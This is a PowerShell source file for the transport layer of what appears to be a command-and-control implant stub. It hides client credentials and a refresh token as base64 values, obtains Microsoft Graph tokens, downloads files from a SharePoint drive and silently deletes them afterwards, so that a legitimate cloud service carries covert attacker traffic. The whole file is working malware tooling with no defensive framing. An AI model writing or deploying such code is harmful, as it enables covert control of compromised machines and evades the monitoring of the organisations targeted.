# === TRANSPORT: Microsoft Graph API / SharePoint (stub layer, PowerShell) ===
# Credentials substituted by wizard at deploy time.
# Prepended to agent/stub.ps1 and agent/stub_stageless.ps1.

$_Ci = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_CLIENT_ID_B64'))
$_Cs = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_CLIENT_SECRET_B64'))
$_Ti = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_TENANT_ID_B64'))
$_Rt = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_REFRESH_TOKEN_B64'))
$_Si = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_SITE_ID_B64'))

function _Tk {
    try {
        $r = Invoke-RestMethod -Method Post -ErrorAction Stop `
            -Uri "https://login.microsoftonline.com/$_Ti/oauth2/v2.0/token" `
            -ContentType 'application/x-www-form-urlencoded' `
            -Body "grant_type=refresh_token&refresh_token=$_Rt&client_id=$_Ci&client_secret=$_Cs&scope=Sites.ReadWrite.All%20offline_access"
        return $r.access_token
    } catch { _dbg "token error: $_"; return $null }
}

function _Dl($tk, $path) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Authorization', "Bearer $tk")
        $bytes = $wc.DownloadData("https://graph.microsoft.com/v1.0/sites/$_Si/drive/root:${path}:/content")
        return [Text.Encoding]::UTF8.GetString($bytes)
    } catch { _dbg "download '$path' error: $_"; return $null }
}

function _Rm($tk, $path) {
    try {
        Invoke-RestMethod -Method Delete -ErrorAction SilentlyContinue `
            -Uri "https://graph.microsoft.com/v1.0/sites/$_Si/drive/root:${path}:" `
            -Headers @{ Authorization = "Bearer $tk" } | Out-Null
    } catch {}
}
